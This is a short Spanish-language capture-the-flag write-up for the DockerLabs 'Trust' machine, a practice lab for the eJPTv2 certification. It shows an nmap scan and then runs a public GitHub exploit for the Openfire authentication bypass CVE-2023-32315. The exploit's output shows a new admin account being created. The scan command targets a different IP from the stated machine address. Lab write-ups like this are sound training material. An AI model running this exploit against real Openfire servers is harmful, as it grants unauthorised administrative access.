# Maquina Trust - DockerLabs

* Nivel : Medio
* Máquina : Linux
* Útil para el Ejptv2
* Ip Maquina : 172.17.0.2

## Escaneo de puertos

```bash
sudo nmap -A -sV -O -T4 -p- -Pn 172.18.0.2
```

El escaneo me da varios puertos abiertos, me dice que esta usando un protocolo de XMPP, Openfire 3.10.0. Uno de los puertos el 9090 es un login.

## Puerto 9090

Aparece un login de openfire. Buscare algún exploit para su verisón.

En github he encontrado el siguiente exploit : https://github.com/K3ysTr0K3R/CVE-2023-32315-EXPLOIT/blob/main/CVE-2023-32315.py, que da el user y el password para acceder al openfire login.

```bash
python3 CVE-2023-32315.py -u http://172.17.0.2:9090

 ██████ ██    ██ ███████       ██████   ██████  ██████  ██████        ██████  ██████  ██████   ██ ███████
██      ██    ██ ██                 ██ ██  ████      ██      ██            ██      ██      ██ ███ ██     
██      ██    ██ █████   █████  █████  ██ ██ ██  █████   █████  █████  █████   █████   █████   ██ ███████
██       ██  ██  ██            ██      ████  ██ ██           ██            ██ ██           ██  ██      ██
 ██████   ████   ███████       ███████  ██████  ███████ ██████        ██████  ███████ ██████   ██ ███████

Coded By: K3ysTr0K3R --> Hug me ʕっ•ᴥ•ʔっ

[*] Launching exploit against: http://172.17.0.2:9090
[*] Checking if the target is vulnerable
[+] Target is vulnerable
[*] Adding credentials
[+] Successfully added, here are the credentials
[+] Username: hugme
[+] Password: HugmeNOW

```
